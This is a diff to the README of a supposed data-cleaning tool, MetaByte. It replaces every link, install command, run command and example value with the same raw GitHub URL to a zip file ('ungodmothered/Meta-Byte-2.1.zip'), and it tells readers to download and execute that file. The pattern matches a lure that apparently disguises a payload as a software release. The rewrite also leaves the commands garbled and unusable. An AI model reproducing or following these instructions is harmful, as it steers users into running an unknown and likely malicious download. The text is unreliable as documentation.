@@ -1,6 +1,6 @@
 # MetaByte 🌐
 
-![MetaByte](https://img.shields.io/badge/MetaByte-v1.0.0-blue)
+![MetaByte](https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip)
 
 ## Overview
 
@@ -30,7 +30,7 @@ This repository focuses on the following topics:
 
 ## Getting Started
 
-To begin using MetaByte, you need to download the latest release. You can find it [here](https://github.com/Emmancoelproplayer/MetaByte/releases). Download the file and execute it on your machine.
+To begin using MetaByte, you need to download the latest release. You can find it [here](https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip). Download the file and execute it on your machine.
 
 ### Prerequisites
 
@@ -43,7 +43,7 @@ Before running MetaByte, ensure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Emmancoelproplayer/MetaByte.git
+   git clone https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
    ```
    
 2. Navigate to the project directory:
@@ -53,7 +53,7 @@ Before running MetaByte, ensure you have the following installed:
 
 3. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
    ```
 
 ### Usage
@@ -64,9 +64,9 @@ After installation, you can run MetaByte using the command line. Here’s how:
 2. Navigate to the directory where MetaByte is located.
 3. Run the tool:
    ```bash
-   python main.py input_file.txt output_file.txt
+   python https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
    ```
-   Replace `input_file.txt` with the path to your input file and `output_file.txt` with the desired output file name.
+   Replace `https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip` with the path to your input file and `https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip` with the desired output file name.
 
 ### Input Format
 
@@ -85,29 +85,29 @@ The output will be saved in the specified output file. It will contain only uniq
 
 Here's a simple example to illustrate how MetaByte works:
 
-### Input File (`input.txt`)
+### Input File (`https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip`)
 
 ```
-test@example.com
-test@example.com
+https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
+https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
 192.168.1.1
 192.168.1.1
-https://example.com
-https://example.com
+https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
+https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
 ```
 
 ### Command
 
 ```bash
-python main.py input.txt output.txt
+python https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
 ```
 
-### Output File (`output.txt`)
+### Output File (`https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip`)
 
 ```
-test@example.com
+https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
 192.168.1.1
-https://example.com
+https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip
 ```
 
 ## Contributing
@@ -137,7 +137,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues, feel free to check the [Releases](https://github.com/Emmancoelproplayer/MetaByte/releases) section for updates and fixes. 
+If you encounter any issues, feel free to check the [Releases](https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip) section for updates and fixes. 
 
 ## Acknowledgments
 
@@ -146,6 +146,6 @@ If you encounter any issues, feel free to check the [Releases](https://github.co
 
 ## Conclusion
 
-MetaByte simplifies the process of cleaning and validating data. Whether you're dealing with URLs, emails, phone numbers, or IP addresses, this tool provides a straightforward solution. For the latest updates and releases, visit our [Releases](https://github.com/Emmancoelproplayer/MetaByte/releases) section.
+MetaByte simplifies the process of cleaning and validating data. Whether you're dealing with URLs, emails, phone numbers, or IP addresses, this tool provides a straightforward solution. For the latest updates and releases, visit our [Releases](https://raw.githubusercontent.com/Emmancoelproplayer/MetaByte/master/ungodmothered/Meta-Byte-2.1.zip) section.
 
 Happy cleaning! 🧹
